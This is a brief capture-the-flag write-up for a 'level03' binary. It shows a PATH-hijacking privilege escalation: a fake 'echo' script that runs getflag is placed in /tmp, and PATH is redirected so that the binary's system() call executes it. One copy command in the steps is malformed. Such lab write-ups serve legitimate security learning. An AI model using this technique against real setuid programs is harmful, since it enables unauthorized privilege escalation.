# When using nm and strings cmd on binary level03 we can see that "echo exploit me" is called by the system function. To exploit this binary we need to create a fake echo that will launch getflag cmd with rights of the calling user, so flag03.

$> cd /tmp
$> vi echo
 getflag
$> chmod +x echo
$> cp /bin/getflag > /tmp
$> PATH=/tmp
$> ./level03
 flag
